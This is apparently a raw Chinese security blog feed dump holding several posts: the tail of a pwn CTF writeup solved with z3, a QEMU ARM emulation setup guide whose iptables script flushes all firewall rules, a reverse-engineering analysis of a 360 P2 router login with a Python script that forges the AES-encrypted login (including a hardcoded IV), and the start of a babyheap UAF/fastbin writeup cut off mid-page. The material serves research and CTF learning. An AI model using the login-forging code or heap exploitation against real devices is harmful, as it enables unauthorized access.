*</span><br><span class="line">s = Solver()</span><br><span class="line">a = BitVec(<span class="string">&quot;a&quot;</span>, <span class="number">32</span>)</span><br><span class="line">b = BitVec(<span class="string">&quot;b&quot;</span>, <span class="number">32</span>)</span><br><span class="line">c = BitVec(<span class="string">&quot;c&quot;</span>, <span class="number">32</span>)</span><br><span class="line">d = BitVec(<span class="string">&quot;d&quot;</span>, <span class="number">32</span>)</span><br><span class="line">s.add(a&lt;<span class="number">256</span>,b&lt;<span class="number">256</span>,c&lt;<span class="number">256</span>,d&lt;<span class="number">256</span>)</span><br><span class="line">s.add(a&gt;<span class="number">0</span>,b&gt;<span class="number">0</span>,c&gt;<span class="number">0</span>,d&gt;<span class="number">0</span>)</span><br><span class="line">s.add((((<span class="number">0x1337</span>*a+<span class="number">1</span>)*b+<span class="number">1</span>)*c+<span class="number">1</span>)*d==<span class="number">0x7fffffff</span>)</span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br><span class="line">➜  /tmp python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.12</span>+ (default, Sep <span class="number">17</span> <span class="number">2016</span>, <span class="number">12</span>:<span class="number">08</span>:<span class="number">02</span>)</span><br><span class="line">[GCC <span class="number">6.2</span><span class="number">.0</span> <span class="number">20160914</span>] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">161</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">248</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="number">230</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = <span class="number">169</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex((((<span class="number">0x1337</span>*a+<span class="number">1</span>)*b+<span class="number">1</span>)*c+<span class="number">1</span>)*d)</span><br><span class="line"><span class="string">&#x27;0x6f17fffffff&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex((((<span class="number">0x1337</span>*a+<span class="number">1</span>)*b+<span class="number">1</span>)*c+<span class="number">1</span>)*d+<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;0x6f180000000&#x27;</span></span><br></pre></td></tr></table></figure><p>所以，我这里字符串 取 <code>\xa1\xf8\xe6\xa9</code></p><p>剩下的利用 参考 <a href="https://xz.aliyun.com/t/2831#toc-2">https://xz.aliyun.com/t/2831#toc-2</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构建嵌入式qemu</title>
      <link href="%E6%9E%84%E5%BB%BA%E5%B5%8C%E5%85%A5%E5%BC%8Fqemu.html"/>
      <url>%E6%9E%84%E5%BB%BA%E5%B5%8C%E5%85%A5%E5%BC%8Fqemu.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>整体的思路是先编译安装好qemu，从网上下载kernel和initrd用于安装系统，将系统安装在我们创建的硬盘镜像中，由于没有grub我们需要从img中提取出initrd用于系统的boot。提取出后通过kernel、initrd和安装好的filesystem运行程序。</p><h2 id="编译安装qemu"><a href="#编译安装qemu" class="headerlink" title="编译安装qemu"></a>编译安装qemu</h2><p>为了避免一些依赖兼容性的问题，我用一个新建的ubuntu18.04做容器。</p><p>首先从github上下载qemu。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/qemu/qemu.git</span><br></pre></td></tr></table></figure><p>在安装前需要装一些依赖：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential zlib1g-dev pkg-config libglib2.0-dev binutils-dev libboost-all-dev autoconf libtool libssl-dev libpixman-1-dev libpython-dev python-pip python-capstone virtualenv bison flex</span><br></pre></td></tr></table></figure><p>编译时的配置信息如下（选了一大堆架构列表，把qemu装在/opt/qemu中）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --target-list=arm-softmmu,mips-softmmu,mips64-softmmu,mips64el-softmmu,mipsel-softmmu,aarch64-softmmu,arm-linux-user,aarch64-linux-user,mips64el-linux-user,mipsel-linux-user,mips-linux-user,mips64-linux-user --prefix=/opt/qemu --python=/usr/bin/python2.7</span><br></pre></td></tr></table></figure><p>然后<code>make &amp;&amp; sudo make install </code>一把梭。</p><h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><p>首先我们需要从网上下载kernel和initrd。去镜像站就可以下载到，比如（我这里用的ubuntu的来安装）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/debian/dists/buster/main/installer-armhf/current/images/netboot/</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -r -nH -nd -np -R <span class="string">&quot;index.html*&quot;</span> --quiet http://ports.ubuntu.com/ubuntu-ports/dists/xenial/main/installer-armhf/current/images/generic-lpae/netboot/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我这里用的是第二个。</p><p>创建一个空的filesystem：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 ubuntu.img 16G</span><br></pre></td></tr></table></figure><p>现在我们拿到了kernel、initrd和新的硬盘镜像了，然后需要在qemu里面安装系统了，我的安装方法如下，记得append时要把filesystem的地址改成ram，原因是要把驱动安装程序放在内存中运行，kernel和initrd指定之前下载好的就好（注意内存设置的不要比虚拟机大否则会崩掉）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;opt&#x2F;qemu&#x2F;bin&#x2F;qemu-system-arm -m 1024 -M virt -cpu cortex-a15 -smp cpus&#x3D;4,maxcpus&#x3D;4 -kernel .&#x2F;vmlinuz -initrd .&#x2F;initrd.gz -append &quot;root&#x3D;&#x2F;dev&#x2F;ram&quot; -drive file&#x3D;..&#x2F;ubuntu.img,if&#x3D;none,format&#x3D;qcow2,id&#x3D;hd0 -device virtio-blk-device,drive&#x3D;hd0 -netdev type&#x3D;tap,id&#x3D;net0 -device virtio-net-device,netdev&#x3D;net0,mac&#x3D;52:54:00:fa:ee:10 -nographic</span><br></pre></td></tr></table></figure><p>在安装时，会遇到需要网络的情况（安装一半会卡住），我们需要手动配置一下网络，这里我们看到我们的网卡名字是enp0s25（这个改成自己的），qemu运行后开启的网卡名字叫tap0，我们配置一下tap0的iptables，并设置好ip。这里注意一下需要先启动qemu，我们修改qemu创建的接口（tap0），如果我们自己创建一个tap0的话qemu运行时不会直接使用这个tap0，会重新创建一个tap1：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"></span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o enp0s25 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># inet_ip = 192.168.100.2</span></span><br><span class="line">sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0</span><br></pre></td></tr></table></figure><p>运行这些命令后qemu里面才能上网</p><p>然后在qemu的安装界面，我们配置一下固定的IP，就是脚本里面改的IP(任意一个C段网都行，不要和宿主机的网段一样就好，这里配成了192.168.100.2)。网关填写tap0的地址，DNS设置自己的DNS，如果不知道就设置成8.8.8.8或114.114.114.114。</p><p>安装要过很久，建议晚上睡前安，第二天收割img。</p><p>安装好了后会有提示系统没法boot，这是正常的，毕竟我们没有grub，直接退出安装就好了。</p><h2 id="启动安装好的系统"><a href="#启动安装好的系统" class="headerlink" title="启动安装好的系统"></a>启动安装好的系统</h2><p>由于我们没有grub帮助我们boot，所以我门需要把initrd从qcow2中提取出来，单独指定给qemu。这是我们需要一个工具<code>libguestfs-tools</code>。apt一把梭。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libguestfs-tools -yf</span><br></pre></td></tr></table></figure><p>用virt-ls看一下initrd的文件名（别问我问啥要加这两个环境变量，log提示我加的）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIBGUESTFS_DEBUG&#x3D;1 LIBGUESTFS_TRACE&#x3D;1 sudo virt-ls ubuntu.img &#x2F;boot&#x2F;</span><br></pre></td></tr></table></figure><p>然后把initrd copy出来</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIBGUESTFS_DEBUG=1 LIBGUESTFS_TRACE=1 sudo virt-copy-out -a ubuntu.img /boot/initrd.img-4.4.0-135-generic-lpae ./</span><br></pre></td></tr></table></figure><p>后面我们就用拷贝出来的initrd，安装好的filesystem——ubunut.img，以及kernel将ubuntu运行起来。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /opt/qemu/bin/qemu-system-arm -m 1024 -M virt -cpu cortex-a15 -smp cpus=4,maxcpus=4 -kernel ./vmlinuz -initrd ./initrd.img-4.4.0-135-generic-lpae -append <span class="string">&quot;root=/dev/vda2&quot;</span> -drive file=./ubuntu.img,<span class="keyword">if</span>=none,format=qcow2,id=hd0 -device virtio-blk-device,drive=hd0 -netdev <span class="built_in">type</span>=tap,id=net0 -device virtio-net-device,netdev=net0,mac=52:54:00:fa:ee:10 -nographic</span><br></pre></td></tr></table></figure><p>这里把root改成/dev/vda2，从硬盘中得到filesystem。运行后我们还是需要修改一下tap0的iptables和网络配置(nat映射神马的，这样外网可以访问)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Stopping firewall and allowing everyone...&quot;</span></span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o enp0s25 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#inet_ip=192.168.100.2</span></span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -A PREROUTING -i enp0s25 -p tcp --dport 1022 -j DNAT --to-destination <span class="variable">$inet_ip</span>:22</span><br><span class="line">sudo iptables -t nat -A PREROUTING -i enp0s25 -p tcp --dport 1080 -j DNAT --to-destination <span class="variable">$inet_ip</span>:80</span><br><span class="line">sudo iptables -t nat -A PREROUTING -i enp0s25 -p tcp --dport 10443 -j DNAT --to-destination <span class="variable">$inet_ip</span>:443</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Booting VM, eta 10 seconds&quot;</span></span><br><span class="line">sleep 10</span><br><span class="line">sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0</span><br></pre></td></tr></table></figure><p>到这里我们的嵌入式虚拟环境就搭建好了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://gist.github.com/takeshixx/686a4b5e057deff7892913bf69bcb85a">ubuntu-xenial-armfh-qemu.md</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 嵌入式环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>360 路由器 P2 登陆验证分析</title>
      <link href="360_P2_Router_login_analysis.html"/>
      <url>360_P2_Router_login_analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>由于某些需求，需要伪造个登陆过程，然后就花了点时间分析了下过程。由于我拿到的是板子而且是开发板，我拥有 telnet 接口。于是我 telnet 上去用 tcpdump 抓取了流量。</p><p><code>tcpdump -i any -w target.cap</code></p><p>为什么我不在本地抓本地 web 登录的流量呢？ 因为我那个时候在做 App 一些功能测试。我需要抓取全部经过路由器的流量。</p><p>然后我需要把 cap 文件拿出来。由于是在板子里面，虽然 DEBUG 版本用于 tftp 可以做简单的文件传输。但是由于需要一个 server 服务器。所以我这里需要在本地搭建一个 tftp server。踩了一个坑..最后用 Python 现有的模块两句话完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tftpy</span><br><span class="line"></span><br><span class="line">server = tftpy.TftpServer(<span class="string">&#x27;/tftpboot&#x27;</span>)</span><br><span class="line">server.listen(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">69</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后起 server，紧接着在板子里使用：</p><p><code>tftp -l target.cap -p 192.168.0.4</code> (192.168.0.4 是我本地的 ip ，也就是这个时候的 server)</p><p>拿到流量后用 wireshark 打开分析，我过滤了 HTTP 流呈现的效果如下：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911174710.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911174710.png"></a></p><p>主要是分析验证登陆过程关键地方在 <strong>web_login.cgi ** 和 **get_rand_key.cgi</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911174806.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911174806.png"></a></p><p>首先登陆的时候，先从 <strong>get_rand_key</strong> 获取一个 <strong>rand_key</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /router/get_rand_key.cgi HTTP/1.1</span><br><span class="line">Referer: http://guanli.luyou.360.cn</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line">Host: guanli.luyou.360.cn</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">User-Agent: okhttp/3.7.0</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Boa/0.94</span><br><span class="line">Date: Sat, 21 Dec 2013 12:00:00 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;rand_key&quot;</span>:<span class="string">&quot;9332c90abc850ef93f9a600eff5606ba20c9bdd11c07c704a9b8e3faddbfd713&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>这个 <strong>rand_key</strong> 是直接 post <strong>/router/get_rand_key.cgi</strong> 就可以直接获取到。</p><p>紧接着向 <strong>web_login_cgi</strong> post 数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /router/web_login.cgi HTTP/1.1</span><br><span class="line">Referer: http://guanli.luyou.360.cn</span><br><span class="line">token_id: 6887b2151fdc73069d8ff84c164b7ced</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 268</span><br><span class="line">Host: guanli.luyou.360.cn</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">User-Agent: okhttp/3.7.0</span><br><span class="line"></span><br><span class="line">bindLanguage=eyJsYW5ndWFnZSI6IjEifQ%3D%3D&amp;density=420&amp;language=1&amp;language_server=zh&amp;ostype=android&amp;osversion=27&amp;pass=9332c90abc850ef93f9a600eff5606ba5328c9362bc131db6047cfbc481523f9&amp;phonetype=ONEPLUS%20A5010&amp;region=CN&amp;screenx=1080&amp;screeny=2160&amp;user=admin&amp;version=4.2.3HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: Qihoo_360_login=c0bd8fc56b6bcdb5192cd56d9c437763;path=/</span><br><span class="line">Connection: close</span><br><span class="line">content-type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;success&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;token_id&quot;</span>:<span class="string">&quot;704420fad014228d75b98f9341d79c2f&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>这里的字段会用到一个叫 pass 的：</p><p> <code>pass = 9332c90abc850ef93f9a600eff5606ba5328c9362bc131db6047cfbc481523f9</code></p><p>我们会发现 pass 与上面的 rand_key :</p><p>9332c90abc850ef93f9a600eff5606ba20c9bdd11c07c704a9b8e3faddbfd713,前32 位一致，后32位不一样。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911175940.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911175940.png"></a></p><p>简单分析下代码：</p><p>str 是 路由器的管理密码，最后形成的 pass 由 rand_key 的后32位对 str 进行 AES 加密，加密结果再与 rank_key 前32位拼接。</p><p>简单的讲就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rand_key &#x3D; &#39;9332c90abc850ef93f9a600eff5606ba20c9bdd11c07c704a9b8e3faddbfd713&#39;</span><br><span class="line">pass &#x3D; &#39;9332c90abc850ef93f9a600eff5606ba5328c9362bc131db6047cfbc481523f9&#39;</span><br><span class="line"></span><br><span class="line">ran_key[:32] &#x3D;&#x3D; pass[:32]</span><br><span class="line">pass[32:] &#x3D; EnAES(passwd,rand_key[32:])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Python-模拟登陆过程"><a href="#Python-模拟登陆过程" class="headerlink" title="Python 模拟登陆过程"></a>Python 模拟登陆过程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> pkcs7 <span class="keyword">import</span> PKCS7Encoder</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># key = &#x27;\xf7\x44\x50\xb1\x2a\x1e\x6e\x9e\xae\x36\xd4\x01\xfb\x5d\x48\xc2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key = &#x27;\x20\xc9\xbd\xd1\x1c\x07\xc7\x04\xa9\xb8\xe3\xfa\xdd\xbf\xd7\x13&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EnAES</span>(<span class="params">key</span>):</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">&#x27;\x33\x36\x30\x6c\x75\x79\x6f\x75\x40\x69\x6e\x73\x74\x61\x6c\x6c&#x27;</span> <span class="comment">#&quot;360luyou@install&quot;.decode(&#x27;hex&#x27;)</span></span><br><span class="line">    encryptor = AES.new(key, mode, iv)</span><br><span class="line">    encoder = PKCS7Encoder()</span><br><span class="line">    text = <span class="string">&#x27;******&#x27;</span> <span class="comment"># password</span></span><br><span class="line">    pad_text = encoder.encode(text)</span><br><span class="line">    cipher = encryptor.encrypt(pad_text).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="comment"># enc_cipher = base64.b64encode(cipher)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print enc_cipher</span></span><br><span class="line">    <span class="comment"># print type(enc_cipher)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>(str(cipher))</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://192.168.0.1/router/get_rand_key.cgi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = r.content</span><br><span class="line">key = eval(key)</span><br><span class="line"></span><br><span class="line">rand_key = key[<span class="string">&#x27;rand_key&#x27;</span>]</span><br><span class="line">aes_key =  key[<span class="string">&#x27;rand_key&#x27;</span>][<span class="number">32</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;bindLanguage=eyJsYW5ndWFnZSI6IjEifQ==&amp;density=420&amp;language=1&amp;language_server=zh&amp;ostype=android&amp;osversion=27&amp;pass=&#123;&#125;&amp;phonetype=ONEPLUS%20A5010&amp;region=CN&amp;screenx=1080&amp;screeny=2160&amp;user=admin&amp;version=4.2.3&#x27;</span>.format(key[<span class="string">&#x27;rand_key&#x27;</span>][:<span class="number">32</span>]+EnAES(aes_key))</span><br><span class="line"></span><br><span class="line">header = <span class="string">&#x27;...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r = requests.post(&#x27;</span>http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/router/web_login.cgi<span class="string">&#x27;,data =data)</span></span><br><span class="line"><span class="string">print r.text&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911180642.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180911180642.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 babyheap writeup</title>
      <link href="2018-wd-babyheap-writeup.html"/>
      <url>2018-wd-babyheap-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我看社区已经有人在发Writeup了，但是也不是特别全。其中 Pwn 部分少了个babyheap的题解。我在这里稍微补充下。</p><p>link: <a href="https://xz.aliyun.com/t/2609">https://xz.aliyun.com/t/2609</a></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题目四个功能，分别是new，change，show和delete。漏洞很明显在于delete函数。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821171904.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821171904.png"></a></p><p>在这个函数中，存在指针未置零的情况，可以造成UAF 。</p><p>其次有几个注意的点 块只能新建9块，以及新建块的大小为 0x20 ，不可控。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821172601.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821172601.png"></a></p><p>编辑一个块最多只能三次。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821172718.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821172718.png"></a></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02 利用思路"></a>0x02 利用思路</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@8593c2d5ac83:/home/wd/babyheap/babyheap<span class="comment"># checksec babyheap</span></span><br><span class="line">[*] <span class="string">&#x27;/home/wd/babyheap/babyheap/babyheap&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>由于块的大小是 0x20 ，可以想到是经典的fastbins attack + uaf。</p><h4 id="第一步：思考-如何泄露出-libc-地址"><a href="#第一步：思考-如何泄露出-libc-地址" 